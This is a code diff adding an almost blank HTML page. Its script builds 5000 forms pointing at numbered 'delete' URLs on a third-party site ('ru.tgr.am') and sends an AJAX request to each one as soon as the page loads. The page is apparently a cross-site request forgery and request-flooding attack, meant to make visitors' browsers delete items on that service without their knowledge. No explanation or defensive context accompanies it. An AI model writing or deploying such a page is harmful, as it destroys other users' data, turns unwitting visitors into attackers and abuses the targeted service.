@@ -1,0 +1,35 @@
+<body> </body>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<script type="text/javascript">
+for (i = 0; i < 5000; i++) { 
+
+	var f = document.createElement("form");
+	f.setAttribute('method', "GET");
+	f.setAttribute('target', "_blank");
+	f.setAttribute('action', "https://ru.tgr.am/delete/a/" + i);
+	document.getElementsByTagName('body')[0].appendChild(f);
+	//f.submit();
+	}
+
+$( document ).ready(function() {
+	$( "body form" ).each(function() {
+	     console.log( this );
+	     
+        var $form = $(this);
+	             $.ajax({
+	               type: $form.attr('method'),
+	               url: $form.attr('action'),
+	               data: $form.serialize()
+	             }).done(function() {
+	               console.log('success');
+	             }).fail(function() {
+	               console.log('fail');
+	             });
+	 
+	});
+
+});
+
+</script>
